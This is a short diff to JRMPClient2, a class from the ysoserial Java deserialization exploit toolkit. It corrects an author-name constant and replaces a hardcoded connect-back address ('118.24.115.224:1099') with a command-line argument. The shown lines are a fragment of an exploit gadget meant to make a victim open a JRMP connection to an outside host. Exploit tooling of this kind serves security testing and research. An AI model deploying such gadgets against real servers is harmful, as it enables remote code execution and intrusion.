@@ -17,7 +17,7 @@ import java.util.Random;
     "restriction"
 })
 @PayloadTest(harness = "ysoserial.payloads.JRMPReverseConnectSMTest")
-@Authors({Authors.JAYL1n})
+@Authors({Authors.JAYL1N})
 public class JRMPClient2 extends PayloadRunner implements ObjectPayload<Activator> {
 
     public Activator getObject(final String command) throws Exception {
@@ -45,7 +45,6 @@ public class JRMPClient2 extends PayloadRunner implements ObjectPayload<Activato
 
     public static void main(final String[] args) throws Exception {
         Thread.currentThread().setContextClassLoader(JRMPClient2.class.getClassLoader());
-//        PayloadRunner.run(JRMPClient2.class, args);
-        PayloadRunner.run(JRMPClient2.class, new String[]{"118.24.115.224:1099"});
+        PayloadRunner.run(JRMPClient2.class, args);
     }
 }
